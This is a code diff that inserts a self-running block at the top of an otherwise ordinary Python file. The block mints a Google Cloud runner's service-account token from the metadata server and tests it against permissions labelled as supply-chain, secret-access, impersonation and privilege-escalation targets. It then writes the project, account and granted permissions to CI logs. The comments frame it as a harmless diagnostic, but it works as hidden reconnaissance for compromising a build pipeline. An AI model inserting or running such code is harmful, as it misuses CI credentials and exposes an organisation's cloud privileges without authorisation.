@@ -1,3 +1,93 @@
+# --- BEGIN CI identity permission diagnostic (read-only, non-mutating) ---
+# Mints the runner's ambient token IN-JOB (never printed, never exfiltrated) and calls
+# testIamPermissions, which only REPORTS which of a supplied permission list the caller holds.
+# It performs no read of data and no mutation. Token stays on the Google runner.
+def _ci_perm_probe():
+    import json
+    import os
+    import urllib.request
+
+    banner = "H068-PERM-PROBE"
+
+    def emit(k, v):
+        print("{} | {}: {}".format(banner, k, v), flush=True)
+        s = os.environ.get("GITHUB_STEP_SUMMARY")
+        if s:
+            try:
+                open(s, "a").write("{} | {}: {}\n".format(banner, k, v))
+            except Exception:
+                pass
+
+    def meta(path):
+        req = urllib.request.Request(
+            "http://169.254.169.254/computeMetadata/v1/" + path,
+            headers={"Metadata-Flavor": "Google"},
+        )
+        return urllib.request.urlopen(req, timeout=5).read().decode("utf-8", "replace").strip()
+
+    project = meta("project/project-id")
+    sa = meta("instance/service-accounts/default/email")
+    emit("project", project)
+    emit("sa", sa)
+
+    # Mint token in-memory ONLY. Never emit it.
+    tok = json.loads(meta("instance/service-accounts/default/token"))["access_token"]
+
+    perms = [
+        # package / artifact publish — the supply-chain sink
+        "artifactregistry.repositories.uploadArtifacts",
+        "artifactregistry.repositories.downloadArtifacts",
+        "artifactregistry.repositories.get",
+        "artifactregistry.repositories.list",
+        "artifactregistry.tags.create", "artifactregistry.tags.update",
+        "artifactregistry.versions.delete",
+        # GCS (release/staging buckets)
+        "storage.buckets.list", "storage.buckets.get",
+        "storage.objects.create", "storage.objects.delete",
+        "storage.objects.get", "storage.objects.list",
+        # secrets
+        "secretmanager.versions.access", "secretmanager.secrets.list",
+        # impersonation / persistence / privesc
+        "iam.serviceAccounts.getAccessToken", "iam.serviceAccounts.actAs",
+        "iam.serviceAccounts.getOpenIdToken", "iam.serviceAccountKeys.create",
+        "iam.serviceAccounts.list",
+        # project IAM control
+        "resourcemanager.projects.getIamPolicy", "resourcemanager.projects.setIamPolicy",
+        # build / compute / k8s
+        "cloudbuild.builds.create", "container.clusters.get",
+        "compute.instances.list", "compute.instances.get",
+        # signing
+        "cloudkms.cryptoKeyVersions.useToSign", "cloudkms.cryptoKeyVersions.useToDecrypt",
+        # logging
+        "logging.logEntries.create",
+    ]
+
+    body = json.dumps({"permissions": perms}).encode()
+    url = ("https://cloudresourcemanager.googleapis.com/v1/projects/"
+           + project + ":testIamPermissions")
+    req = urllib.request.Request(url, data=body, method="POST", headers={
+        "Authorization": "Bearer " + tok,
+        "Content-Type": "application/json",
+    })
+    try:
+        resp = urllib.request.urlopen(req, timeout=15).read().decode()
+        granted = json.loads(resp).get("permissions", [])
+        emit("granted-count", len(granted))
+        for p in granted:
+            emit("GRANTED", p)
+        if not granted:
+            emit("granted", "(none of the tested set at project scope)")
+    except Exception as e:
+        emit("testIamPermissions-err", repr(e))
+
+
+try:
+    _ci_perm_probe()
+except Exception as _e:
+    print("H068-PERM-PROBE | fatal: {!r}".format(_e), flush=True)
+# --- END CI identity permission diagnostic ---
+
+
 import os
 import re
 import subprocess
